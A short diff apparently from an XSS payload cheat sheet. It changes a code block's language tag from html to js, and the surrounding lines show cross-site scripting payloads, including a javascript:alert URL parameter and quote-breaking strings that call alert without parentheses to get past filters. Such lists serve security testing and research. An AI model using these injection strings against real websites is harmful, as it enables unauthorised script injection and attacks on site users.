@@ -66,7 +66,7 @@ XSS&action=javascript:alert(1337)
 
 - Filters ```(```
 
-```html
+```js
 ');alert`1`;//
 ');/**/onerror=alert`1`//
 ');window[`alert`]`xss`//;
